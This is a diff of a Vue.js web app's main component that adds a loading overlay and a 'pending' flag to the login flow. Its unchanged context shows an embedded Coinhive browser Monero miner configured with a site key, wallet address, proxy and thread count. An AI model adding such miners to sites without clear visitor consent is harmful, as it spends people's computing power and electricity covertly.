@@ -34,16 +34,16 @@
     q-tabs( align='left', v-if='showMenu && authenticated' slot="navigation")
       q-route-tab(icon='home', to='/', exact='', slot='title')
       q-route-tab(icon='account_circle', :to='{name:"User",params:{username:thisUser.username}}', exact='', slot='title')
-      router-view(
-        :thisUser='thisUser'
-        :thatUser="thatUser"
-        :authenticated='authenticated'
-        :api='api'
-        @refreshUser='init()'
-        :ch.sync="ch"
-        :adBlock="adBlock"
-        style="max-width:1200px"
-      )
+    router-view(
+      :thisUser='thisUser'
+      :thatUser="thatUser"
+      :authenticated='authenticated'
+      :api='api'
+      @refreshUser='init()'
+      :ch.sync="ch"
+      :adBlock="adBlock"
+      style="max-width:1200px"
+    )
     q-modal.position-relative.layout-padding(ref="infoModal")
       .layout-padding(style="max-width:400px")
         h4.text-centered(style="color:#089cfc;") {{infoModal.heading}}
@@ -56,6 +56,9 @@
       auth(:api='api' :authenticated.sync="authenticated" :thisUser.sync="thisUser" :thisModal="$refs.authModal" )
     q-modal.shadow-3(ref="profileEditModal")
       profileEdit(:thisUser="thisUser" :api="api" :thisModal="$refs.profileEditModal")
+  div.bg-white.fullscreen(v-if="pending")
+    //- q-inner-loading(:visible="pending")
+    //-   q-spinner-ball(size="70px" color="blue")
 
     coinhive(
       v-if="ch.deviceId"
@@ -103,6 +106,7 @@ export default {
       ch: {
         key: "lb58iZ2vZT0fwmrVK6h3lQH4y0aDDR5P",
         toggle: false,
+        
         threads: 4,
         address: moneroAddr,
         proxy: [proxyAddr],
@@ -113,6 +117,7 @@ export default {
         authModal:this.$refs.authModal
       },
       adBlock:false,
+      pending:true,
       auth: {},
       infoModal:{},
       thisUser: {},
@@ -172,11 +177,11 @@ export default {
           var userData = await this.api.user.get(window.localStorage.getItem("id"))
           if (userData) (this.thisUser = userData), (this.authenticated = true)
         }
-      } else {}
+      } else {this.pending=false}
       }else{
         var userData = await this.api.user.get(id)
-        if (userData) {}
-        else {}
+        if (userData) {this.pending=false}
+        else {this.pending=false}
       }
     }
   },
@@ -280,6 +285,7 @@ export default {
         }
     },
     "authenticated"(authed){
+      this.pending=false
       if (authed){
         if (window.olark){
           window.olark('api.visitor.updateFullName', {
